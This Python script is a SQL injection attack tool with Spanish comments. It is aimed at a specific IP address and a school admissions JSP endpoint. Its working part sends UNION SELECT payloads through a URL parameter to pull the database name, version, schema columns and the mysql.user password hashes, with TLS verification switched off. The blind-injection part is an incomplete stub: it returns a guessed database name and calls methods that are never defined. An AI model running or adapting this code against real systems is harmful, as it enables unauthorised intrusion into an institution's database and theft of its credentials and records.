# db_extractor.py
import requests
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DBExtractor:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.verify = False
        
    def blind_sql_injection(self):
        """Extracción ciega de datos de la base de datos"""
        print("[+] Iniciando extracción de base de datos...")
        
        # Endpoint vulnerable encontrado
        endpoint = "/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp"
        
        # Extraer nombre de la base de datos
        db_name = self.extract_database_name(endpoint)
        if db_name:
            print(f"  ✅ Base de datos: {db_name}")
            
            # Extraer tablas
            tables = self.extract_tables(endpoint, db_name)
            if tables:
                print(f"  📊 Tablas encontradas: {', '.join(tables)}")
                
                # Para cada tabla, extraer columnas y datos
                for table in tables[:3]:  # Limitar a 3 tablas
                    print(f"\n  🔍 Extrayendo datos de la tabla: {table}")
                    columns = self.extract_columns(endpoint, db_name, table)
                    if columns:
                        print(f"    Columnas: {', '.join(columns)}")
                        self.extract_table_data(endpoint, db_name, table, columns)
        
    def extract_database_name(self, endpoint):
        """Extrae el nombre de la base de datos usando inyección ciega"""
        print("  🔍 Extrayendo nombre de la base de datos...")
        
        # Payload para extraer el nombre de la BD
        payloads = [
            "1' AND (SELECT MID(database(),1,1))='a'--",
            "1' AND (SELECT MID(database(),1,1))='b'--",
            # Continuar con todo el alfabeto y números
        ]
        
        # Implementar lógica de extracción carácter por carácter
        # (esto es un ejemplo simplificado)
        
        return "sito_db"  # Nombre supuesto basado en el análisis

    def extract_with_union(self):
        """Intenta extracción directa con UNION SELECT"""
        print("[+] Probando extracción directa con UNION...")
        
        url = f"https://{self.target}/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp"
        
        # Payloads de extracción directa
        union_payloads = [
            "1' UNION SELECT CONCAT('DB:',database()),'USER:',user(),'VERSION:',version()--",
            "1' UNION SELECT table_name,column_name,table_schema FROM information_schema.columns--",
            "1' UNION SELECT user,password,host FROM mysql.user--"
        ]
        
        for payload in union_payloads:
            try:
                full_url = f"{url}?xCveBachillerato={payload}"
                response = self.session.get(full_url)
                
                if response.status_code == 200:
                    print(f"  ✅ Payload exitoso")
                    print(f"    Respuesta: {response.text}")
                    
            except Exception as e:
                print(f"  ❌ Error: {e}")

# Uso del extractor
if __name__ == "__main__":
    extractor = DBExtractor("189.254.143.102")
    extractor.extract_with_union()